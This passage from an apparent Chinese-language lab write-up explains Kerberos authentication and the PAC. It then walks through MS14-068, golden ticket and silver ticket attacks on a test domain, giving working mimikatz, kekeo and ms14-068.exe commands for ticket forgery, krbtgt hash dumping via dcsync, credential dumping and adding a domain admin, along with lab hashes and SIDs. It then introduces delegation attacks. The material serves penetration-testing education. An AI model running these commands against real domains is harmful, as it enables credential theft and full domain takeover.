Server 有效</li><li>最终 Server 和 Client 建立通信</li></ol><p>详细认证步骤分为以下三个阶段</p><ul><li>AS_REQ &amp; AS_REP</li><li>TGS_REQ &amp; TGS_REP</li><li>AP_REQ &amp; AP_REP</li></ul><h4 id="as_req-as_rep"><a class="markdownIt-Anchor" href="#as_req-as_rep">#</a> AS_REQ &amp; AS_REP</h4><p>该阶段是 Client 和 AS 的认证，通过认证的客户端将获得 TGT 认购权证</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911160829033.png" alt="image-20220911160829033"></p><ul><li>当域内某个客户端用户 Client 试图访问域内的某个服务，于是输入用户名和密码，此时客户端本机的 Kerberos 服务会向 KDC 的 AS 认证服务发送一个 AS_REQ 认证请求。请求的凭据是 Client 的哈希值 NTLM-Hash 加密的时间戳以及 Clientinfo、Server-info 等数据，以及一些其他信息</li><li>当 Client 发送身份信息给 AS 后，AS 会先向<mark>活动目录 AD</mark> 请求，询问是否有此 Client 用户，如果有的话，就会取出它的 NTLM-Hash，并对 AS_REQ 请求中加密的时间戳进行解密，如果解密成功，则证明客户端提供的密码正确，如果时间戳在五分钟之内，则预认证成功。然后 AS 会生成一个临时秘钥 Session-Key AS，并使用客户端 Client 的 NTLM-Hash 加密 Session-key AS 作为响应包的一部分内容。此 Session-key AS 用于确保客户端和 KGS 之间的通信安全</li><li>还有一部分响应内容内容是 TGT：使用 KDC 一个特定账户的 NTLM-Hash 对 Session-key AS、时间戳、Client-info 进行的加密。这个特定账户就是创建域控时自动生成的 Krbtgt 用户，然后将这两部分以及<mark> PAC</mark> 等信息回复给 Client，即 AS_REP。PAC 中包含的是用户的 SID、用户所在的组等一些信息</li><li>AS-REP 中最核心的东西就是 Session-key 和 TGT。我们平时用 Mimikatz、kekeo、rubeus 等工具生成的凭据是 .kirbi 后缀，Impacket 生成的凭据的后缀是 .ccache。这两种票据主要包含的都是 Session-key 和 TGT，因此可以相互转化</li><li>至此，Kerberos 认证的第一步完成</li></ul><h4 id="tgs_req-tgs_rep"><a class="markdownIt-Anchor" href="#tgs_req-tgs_rep">#</a> TGS_REQ &amp; TGS_REP</h4><p>该阶段是 Client 和 TGS 的认证，通过认证的客户端将获得 ST 服务票据</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911161308310.png" alt="image-20220911161308310"></p><ul><li>客户端 Client 收到 AS 的回复 AS_REP 后分别获得了 TGT 和加密的 Session-Key AS。它会先用自己的 Client NTLM-hash 解密得到原始的 Session-Key AS，然后会在本地缓存此 TGT 和原始的 Session-Key AS，如果现在它就需要访问某台服务器上的服务，他就需要凭借这张 TGT 认购凭证向 KGS 购买相应的 ST 服务票据（也叫 Ticket）</li><li>此时 Client 会使用 Session-Key AS 加密时间戳、Client-info、Server-info 等数据作为一部分。由于 TGT 是用 Krbtgt 账户的 NTLM-Hash 加密的，Client 无法解密，所以 Client 会将 TGT 作为另一部分继续发送给 TGS。两部分组成的请求被称为 TGS_REQ。</li><li>TGS 收到该请求，用 Krbtgt 用户的 NTLM-hash 先解密 TGT 得到 Session-key AS、 时间戳、Client-info 以及 Server-info。再用 Session-key AS 解密第一部分内容，得到 Client-info、时间戳。然后将两部分获取到时间戳进行比较，如果时间戳跟当前时间相差太久，就需要重新认证。TGS 还会将这个 Client 的信息与 TGT 中的 Client 信息进行比较，如果两个相等的话，还会继续判断 Client 有没有权限访问 Server， 如果都没有问题，认证成功。认证成功后，KGS 会生成一个 Session-key TGS，并用 Session-key AS 加密 Session-key TGS 作为响应的一部分。此 Session-key TGS 用于确保客户端和服务器之间的通信安全</li><li>另一部分是使用服务器 Server 的 NTLM-Hash 加密 Session-key TGS、时间戳以及 Client-info 等数据生成的 ST。然后 TGS 将这两部分信息回复给 Client，即 TGS_REP</li><li>至此，Client 和 KDC 的通信就结束了，然后是和 Server 进行通信</li></ul><h4 id="ap_req-ap_rep"><a class="markdownIt-Anchor" href="#ap_req-ap_rep">#</a> AP_REQ &amp; AP_REP</h4><p>该阶段是 Client 和 TGS 的认证，通过认证的客户端将与服务器建立连接。</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911161619504.png" alt="image-20220911161619504"></p><ul><li>客户端 Client 收到 TGS_REP 后，分别获得了 ST 和加密的 Session-Key TGS。它会 先使用本地缓存了的 Session-key AS 解密出了原始的 Session-key TGS。然后它会在本地缓存此 ST 和原始的 Session-Key TGS，当客户端需要访问某台服务器上的服务时会向服务器发送请求。它会使用 Session-key TGS 加密 Client-info、时间戳等信息作为一部分内容。ST 因为使用的是 Server NTLM-hash 进行的加密，无法解密，所以会原封不动发送给 Server。两部分一块发送给 Server，这个请求即是 AP_REQ。</li><li>Server 收到 AP_REQ 请求后，用自身的 Server NTLM-Hash 解密了 ST，得到 Session-Key TGS，再解密出 Client-info、时间戳等数据。然后与 ST 的 Clientinfo、时间戳等进行一一对比。时间戳有效时间一般时间为 8 小时。通过客户端身份验证后，服务器 Server 会拿着 PAC 去询问 DC 该用户是否有访问权限，DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信 息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。通过认证后 Server 将返回最终的 AP-REP 并与 Client 建立通信</li><li>至此，Kerberos 认证流程基本结束</li></ul><h3 id="23-pac"><a class="markdownIt-Anchor" href="#23-pac">#</a> 2.3 PAC</h3><ul><li>我们在前面关于 Kerberos 认证流程的介绍中提到了 PAC（Privilege Attribute Certificate）这个东西，这是微软为了访问控制而引进的一个扩展，即特权访问证书</li><li>在上面的认证流程中，如果没有 PAC 的访问控制作用的话，只要用户的身份验证 正确，那么就可以拿到 TGT，有了 TGT，就可以拿到 ST，有了 ST ，就可以访问服务了。此时任何一个经过身份验证的用户都可以访问任何服务。像这样的认证只解 决了 “Who am i?” 的问题，而没有解决 “What can I do?” 的问题</li><li>为了解决上面的这个问题，微软引进了 PAC。即 KDC 向客户端 Client 返回 AS_REP 时插入了 PAC，PAC 中包含的是用户的 SID、用户所在的组等一些信息。当最后服务端 Server 收到 Client 发来的 AP_REQ 请求后，首先会对客户端身份验证。通过客户端身份验证后，服务器 Server 会拿着 PAC 去询问 DC 该用户是否有访问权限， DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。</li><li>但是在有些服务中并没有验证 PAC 这一步，这也是<mark>白银票据能成功的前提</mark>，因为就算拥有用户的 Hash，可以伪造 TGS，但是也不能制作 PAC， PAC 当然也验证不成功，但是有些服务不去验证 PAC，这是白银票据成功的前提</li></ul><h3 id="24-kerberos认证中的相关安全问题概述"><a class="markdownIt-Anchor" href="#24-kerberos认证中的相关安全问题概述">#</a> 2.4 Kerberos 认证中的相关安全问题概述</h3><p>Kerberos 认证并不是天衣无缝的，这其中也会有各种漏洞能够被我们利用，比如我们常说的 MS14-068、黄金票据、白银票据等就是基于 Kerberos 协议进行攻击 的。下面我们便来大致介绍一下 Kerberos 认证中的相关安全问题</p><h4 id="黄金票据golden-ticket"><a class="markdownIt-Anchor" href="#黄金票据golden-ticket">#</a> 黄金票据（Golden ticket）</h4><ul><li><p>在 Windows 的 kerberos 认证过程中，Client 将自己的信息发送给 KDC，然后 KDC 使用 Krbtgt 用户的 NTLM-Hash 作为密钥进行加密，生成 TGT。那么如果获取到了 Krbtgt 的 NTLM-Hash 值，不就可以伪造任意的 TGT 了吗。因为 Krbtgt 只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个<mark>后门</mark></p></li><li><p>先假设这么一种情况，原先已拿到的域内所有的账户 Hash，包括 Krbtgt 这个账 户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置 Krbtgt 密码，基于此条件，我们还能利用该票据重新获得域管理员权限。利用 Krbtgt 的 Hash 值可以伪造生成任意的 TGT，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于 Kerberos 认证的任何服务</p></li></ul><h4 id="白银票据silver-ticket"><a class="markdownIt-Anchor" href="#白银票据silver-ticket">#</a> 白银票据（Silver ticket）</h4><ul><li>白银票据不同于黄金票据，白银票据的利用过程是伪造 TGS，通过已知的授权服务密码生成一张可以访问该服务的 TGT。因为在票据生成过程中不需要使用 KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由 KDC 颁发 TGT，并且在生成伪造 TGT 的 20 分钟内，TGS 不会对该 TGT 的真伪进行效验。 白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用 Krbtgt 账号的密码哈希值，因此更加隐蔽</li></ul><h4 id="ms14-068"><a class="markdownIt-Anchor" href="#ms14-068">#</a> MS14-068</h4><ul><li>这里便用到了我们之前所讲到的 PAC 这个东西，PAC 是用来验证 Client 的访问权限的，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS。但也恰恰是这个 PAC 造成了 MS14-068 这个漏洞</li><li>该漏洞是位于 kdcsvc.dll 域控制器的密钥分发中心（KDC）服务中的 Windows 漏洞，它允许经过身份验证的用户在其获得的票证 TGT 中插入任意的 PAC 。普通用户可以通过呈现具有改变了 PAC 的 TGT 来伪造票据获得管理员权限</li></ul><h4 id="密码喷洒攻击password-spraying"><a class="markdownIt-Anchor" href="#密码喷洒攻击password-spraying">#</a> 密码喷洒攻击（Password Spraying）</h4><ul><li>在实际渗透中，许多渗透测试人员和攻击者通常都会使用一种被称为 “密码喷洒” （Password Spraying）的技术来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名</li></ul><h4 id="as-rep-roasting"><a class="markdownIt-Anchor" href="#as-rep-roasting">#</a> AS-REP Roasting</h4><ul><li>我们前文说过，AS_REQ &amp; AS_REP 认证的过程是 Kerberos 身份认证的第一步，该过程又被称为预身份验证。预身份验证主要是为了防止密码脱机爆破</li><li>而如果域用户设置了选项 “Do not require Kerberos preauthentication”（该选项默认没有开启）关闭了预身份验证的话，攻击者可以使用指定的用户去请求票据，向域控制器发送 AS_REQ 请求，此时域控会不作任何验证便将 TGT 票据和加密的 Session-key 等信息返回。因此攻击者就可以对获取到的加密 Session-key 进行离线破解，如果爆破成功，就能得到该指定用户的明文密码，这种攻击方式被称作 AS-REP</li></ul><h3 id="25-票据传递攻击"><a class="markdownIt-Anchor" href="#25-票据传递攻击">#</a> 2.5 票据传递攻击</h3><h4 id="ms14-068-2"><a class="markdownIt-Anchor" href="#ms14-068-2">#</a> MS14-068</h4><ul><li>受影响版本：Windows Server 2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 和 Windows Server 2012 R2</li><li>该漏洞可导致活动目录整体权限控制收到影响，允许攻击者将域内任意用户权限提升至域管理级别。</li><li>信息收集：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systeminfo <span class="token operator">|</span> <span class="token function">find</span> <span class="token string">"3011780"</span> <span class="token comment">#如果返回为空则未打补丁</span>systeminfo <span class="token comment">#查看域名称</span>nltest/dsgetdc:域名 <span class="token comment">#查看域控的主机名</span>net config workstation <span class="token comment">#收集域名和其他信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911191248276.png" alt="image-20220911191248276"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-9ESHUR52A3G.moonsec.fbi<span class="token punctuation">\</span>c$ <span class="token comment">#正常情况下无法访问</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用 MS14-068 伪造票据</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span> /all <span class="token comment">#查看当前用户的SID S-1-5-21-3501430782-1563410060-2157377696-1108</span>ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员 sid -d 域控制器地址ms14-068.exe -u 12server1@moonsec.fbi -p <span class="token number">123456</span> -s S-1-5-21-3501430782-1563410060-2157377696-1108 -d WIN-9ESHUR52A3G.moonsec.fbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>执行后会在当前目录下生成一个 TGT 文件</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911191916143.png" alt="image-20220911191916143"></p><ul><li>使用 mimikatz 清空当前内存中的票据，并把这个 TGT 文件导入</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::purge <span class="token comment">#清除当前内存的票据</span>kerberos::ptc <span class="token string">"票据文件"</span> <span class="token comment">#导入票据文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911193244569.png" alt="image-20220911193244569"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911192230621.png" alt="image-20220911192230621"></p><ul><li>此时我们可以向域中添加域管理员账号密码</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">net user moonsec123 Qwe123... &#x2F;add &#x2F;domainnet group &quot;Domain Admins&quot; moonsec123 &#x2F;add &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911192446697.png" alt="image-20220911192446697"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911192547048.png" alt="image-20220911192547048"></p><h4 id="黄金票据"><a class="markdownIt-Anchor" href="#黄金票据">#</a> 黄金票据</h4><ul><li>黄金票据使用的前提是我们已经通过 MS14-068 或者其他方法获取域控权限</li><li>伪造黄金票据的所需条件<ol><li>域名称</li><li>域的 SID 值</li><li>域的 KRBTGT 账号的 HASH</li><li>伪造任意用户名</li></ol></li><li>前面使用 MS14-068 获取了域控权限，可以使用 PsExec 进行反弹 cmd</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PsExec64.exe &#x2F;accepteula &#x2F;s \\WIN-9ESHUR52A3G.moonsec.fbi cmdklist #查看当前内存中的票据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911193430175.png" alt="image-20220911193430175"></p><ul><li>需要上传 mimikatz 进行执行，这里直接使用域控主机执行命令</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">mimikatz(commandline) # privilege::debugmimikatz(commandline) # lsadump::dcsync &#x2F;domain:moonsec.fbi &#x2F;all &#x2F;csvn 或 lsadump::lsa &#x2F;injectmimikatz(commandline) # lsadump::dcsync &#x2F;domain:moonhack.com &#x2F;user:krbtgt#建议使用下面这条，可以将hash和SID一起导出mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:moonsec.fbi &#x2F;user:krbtgt&quot; &quot;exit&quot; &gt; loghash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911194144263.png" alt="image-20220911194144263"></p><ul><li>使用 mimikatz 生成金票.kirbi 文件并保存 ——<mark> 该步骤在获取了 SID 和 HASH 之后在普通域用户主机上执行</mark></li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">mimikatz.exe &quot;kerberos::golden &#x2F;admin:system &#x2F;domain:moonsec.fbi &#x2F;sid:S-1-5-21-3501430782-1563410060-2157377696 &#x2F;krbtgt:39e3601fba3f45772f3055ca9554af1f &#x2F;ticket:ticket.kirbi&quot; exit#&#x2F;admin:伪造的用户名#&#x2F;domain:域名称#&#x2F;sid:SID值，注意是去掉最后一个-的SID值#krbtgt:krbtgt的hash值#&#x2F;ticket:生成的票据名称 &#x2F;&#x2F;不是写入内存中的命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911195902366.png" alt="image-20220911195902366"></p><hr><ul><li>黄金票据的使用：普通域账户利用黄金票据创建域管理员账户</li><li>使用普通域用户，通过 mimikatz 中的 kerberos::ptt 功能将 ticket.kirbi 导入内存中</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">mimikatz # kerberos::purge #清除内存凭证缓存mimikatz # kerberos::ptt C:\Users\test\ticket.kirbi #导入票据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911195457608.png" alt="image-20220911195457608"></p><ul><li>导入后可执行上述创建域用户并提升为域管理员权限</li></ul><h4 id="白银票据"><a class="markdownIt-Anchor" href="#白银票据">#</a> 白银票据</h4><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">klist #查看当前内存中的票据<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>如果说黄金票据是伪造的 TGT, 那么白银票据就是伪造的 ST。 在 Kerberos 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后，通过自己的 Master Key 解密 ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3，进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。 所以我们只需要知道 Server 用户的 Hash 就可以伪造出一个 ST, 且不会经过 KDC， 但是伪造的门票只对部分服务起作用</p></li><li><p>特点：</p><ol><li>不需要与 KDC 交互</li><li>需要 server 的 NTLM Hash</li></ol></li><li><p>mimikatz 制作银票：</p></li><li><p>登录到域服务器的 administrator，执行 mimikatz 的命令获取 NTLM 和 SID</p></li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">whoami &#x2F;all #获取SIDmimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&gt;log.txt #获取hash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911201825408.png" alt="image-20220911201825408"></p><ul><li>使用 mimikatz 清空票据，再导入伪造的银票 —— 在普通域用户执行</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::purgekerberos::golden /domain:moonsec.fbi /sid:S-1-5-21-3068616892-3890610424-3278931909 /target:12server-dc.moonsec.fbi /service:cifs /rc4:42e2656ec24331269f82160ff5962387 /user:administrator /pttkerberos::golden /domain:<span class="token operator">&lt;</span>域名<span class="token operator">></span> /sid:<span class="token operator">&lt;</span>域 SID<span class="token operator">></span> /target:<span class="token operator">&lt;</span>目标服务器主机名<span class="token operator">></span>/service:<span class="token operator">&lt;</span>服务类型<span class="token operator">></span> /rc4:<span class="token operator">&lt;</span>NTLM Hash<span class="token operator">></span> /user:<span class="token operator">&lt;</span>用户名<span class="token operator">></span> /ptt<span class="token comment">#其中用户名可以随便写，服务类型根据以下的选择，因为没有TGT去不断申请ticket，只能针对某一服务来进行伪造</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911202648684.png" alt="image-20220911202648684"></p><ul><li>-_-mimikatz 复现失败</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911202615993.png" alt="image-20220911202615993"></p><hr><ul><li>kekeo 制作银票</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::purge <span class="token comment">#清空票据缓存</span>tgt::ask /user:administrator /domain:moonsec.fbi /ntlm:42e2656ec24331269f82160ff5962387<span class="token comment">#tgt::ask /user:用户名 /domain:域名 /ntlm:NTLM Hash</span>kerberos::ptt TGT_administrator@MOONSEC.FBI_krbtgt~moonsec.fbi@MOONSEC.FBI.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911203413426.png" alt="image-20220911203413426"></p><h4 id="金票和银票的区别"><a class="markdownIt-Anchor" href="#金票和银票的区别">#</a> 金票和银票的区别</h4><ul><li>获取的权限不同<ul><li>金票：伪造的 TGT，可以获取任意 Kerberos 的访问权限</li><li>银票：伪造的 ST，只能访问指定的服务，如 CIFS</li></ul></li><li>认证流程不同<ul><li>金票：同 KDC 交互，但不同 AS 交互</li><li>银票：不同 KDC 交互，直接访问 Server</li></ul></li><li>加密方式不同<ul><li>金票：由 krbtgt NTLM Hash 加密</li><li>银票：由服务账号 NTLM Hash 加密</li></ul></li></ul><h1 id="域委派攻击"><a class="markdownIt-Anchor" href="#域委派攻击">#</a> 域委派攻击</h1><h2 id="1-域委派的相关知识"><a class="markdownIt-Anchor" href="#1-域委派的相关知识">#</a> 1、域委派的相关知识</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>1.1-1.5 来源：————————————————<br> 版权声明：本文为 CSDN 博主「山山而川’」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_44159028/article/details/123994104">https://blog.csdn.net/qq_44159028/article/details/123994104</a></p></blockquote><h3 id="11-什么是委派"><a class="markdownIt-Anchor" href="#11-什么是委派">#</a> 1.1 什么是委派</h3><ul><li><p>首先了解一下什么是委派，委派即委托安排，我把这件事委托给你做了。域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p></li><li><p>委派主要分为<mark>非约束委派 (Unconstrained delegation)<mark> 和</mark>约束委派 (Constrained delegation)<mark> 两个方式，还有一种是</mark>基于资源的约束委派（Resource Based Constrained Delegation）</mark></p></li></ul><h3 id="12-委派的由来"><a class="markdownIt-Anchor" href="#12-委派的由来">#</a> 1.2 委派的由来</h3><ul><li>在 Windows 2000 Server 首次发布 Active Directory 时，Microsoft 必须提供一种简单的机制来支持用户通过 kerberos 向 web server 进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为 &quot;kerberos 双跳问题&quot;，并且要求进行委派，以便 web server 在修改数据库记录时模拟用户。</li><li><strong>这里说的 &quot;以便 web server 在修改数据库记录时模拟用户&quot; 需要如何理解？</strong></li><li>比如数据库中的相关数据需要修改，如果此时如果是让当前的 web server 的服务账户去进行修改的话，那么也就无法记录到到底是谁去修改了这个数据，此时如果出了问题就不知道该去问谁了，这种业务情况下就可能就是需要委派这种功能来进行解决，那么委派之后的情况就是，让当前的 web server 的服务账户去操作，但是 web server 同样带有客户的信息，在修改相关数据的时候，用的是对应客户操作者的记录</li></ul><h3 id="13-为什么使用域委派"><a class="markdownIt-Anchor" href="#13-为什么使用域委派">#</a> 1.3 为什么使用域委派</h3><ul><li>为什么需要域委派呢，比如现在有 web 服务器和文件服务器，当用户 A 访问 web 服务器去请求某个资源时，web 服务器上本身并没有该资源，所以 web 服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：用户 A 访问 web 服务器，服务器再以用户 A 的身份去访问文件服务器</li></ul><h3 id="14-域委派流程"><a class="markdownIt-Anchor" href="#14-域委派流程">#</a> 1.4 域委派流程</h3><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911212008433.png" alt="image-20220911212008433"></p><ul><li>一个域内普通用户 jack 通过 Kerberos 协议认证到前台 WEB 服务后，前台运行 WEB 服务的服务账号 websvc 模拟 (Impersonate) 用户 jack，以 Kerberos 协议继续认证到后台服务器，从而在后台服务器中获取 jack 用户的访问权限，即域中单跳或者多跳的 Kerberos 认证</li><li>流程<ol><li>域内用户 jack 以 Kerberos 方式认证后访问 Web 服务器</li><li>Web 服务以 websvc 服务账号运行，websvc 向 KDC 发起 jack 用户的票据申请</li><li>KDC 检查 websvc 用户的委派属性，如果被设置，则返回 jack 用户的可转发票据 TGT</li><li>websvc 收到 jack 用户 TGT 后，使用该票据向 KDC 申请访问文件服务器的服务票据 ST</li><li>KDC 检查 websvc 的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个 jack 用户访问文件服务的授权票据 ST</li><li>websvc 收到的 jack 用户的授权票据 ST 后，可访问文件服务，完成多跳认证</li></ol></li></ul><h3 id="15-委派的用户"><a class="markdownIt-Anchor" href="#15-委派的用户">#</a> 1.5 委派的用户</h3><ul><li>在域内的可以委派的账户有两种一，种是主机账户（Net Computer），另一种是用 <strong>setspn</strong> 手动添加的服务账户（Net User）<ul><li>服务账号 (Service Account)，域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如 MS SQL Server 在安装时，会在域内自动注册服务账号 SqlServiceAccount，这类账号不能用于交互式登录，也就是说无法通过 SqlServiceAccount 来通过 3389 进行 rdp 登录</li></ul></li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911212222081.png" alt="image-20220911212222081"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911212233024.png" alt="image-20220911212233024"></p><hr><h3 id="16-三种委派攻击"><a class="markdownIt-Anchor" href="#16-三种委派攻击">#</a> 1.6 三种委派攻击</h3><p>分别是：</p><ul><li>非约束委派攻击</li><li>约束委派攻击</li><li>资源委派攻击</li></ul><h2 id="2-非约束委派攻击"><a class="markdownIt-Anchor" href="#2-非约束委派攻击">#</a> 2、非约束委派攻击</h2><ul><li>非约束性委派的原理是：用户想访问服务 A，于是向 KDC 提交认证，KDC 发现 A 是非约束性委派，会把 TGT 放在 ST 中一并给用户。然后用户用这个 ST 去访问服务 A，服务 A 就相当于获得了用户的 TGT，把 TGT 放入 lsass 进程，然后就可以拿着用户的 TGT 以用户的身份去访问该用户权限能够访问的服务了</li><li>从攻击角度来说：如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的 TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911212450470.png" alt="image-20220911212450470"></p><ul><li>当服务账号或者主机被设置为非约束性委派时，其 userAccountControl 属性会包含 TRUSTED_FOR_DELEGATION</li><li>当服务账号或者主机被设置为约束性委派时，其 userAccountControl 属性包含 TRUSTED_TO_AUTH_FOR_DELEGATION，且 msDS-AllowedToDelegateTo 属性会包含被约束的服务</li></ul><h3 id="21-域环境"><a class="markdownIt-Anchor" href="#21-域环境">#</a> 2.1 域环境</h3><ul><li>域备份主机 windows server 2012 - dc1</li><li>域控主机 windows server 2012 - dc2</li><li>域成员主机 windows server 2012 - 12server1</li><li>域成员主机 windows server 2012 - 12server2</li></ul><h3 id="22-配置非约束主机和用户"><a class="markdownIt-Anchor" href="#22-配置非约束主机和用户">#</a> 2.2 配置非约束主机和用户</h3><ul><li>在 dc2 添加 12server2 非约束委派主机，添加新用户 web，并将 web 赋予服务账号权限</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd"># 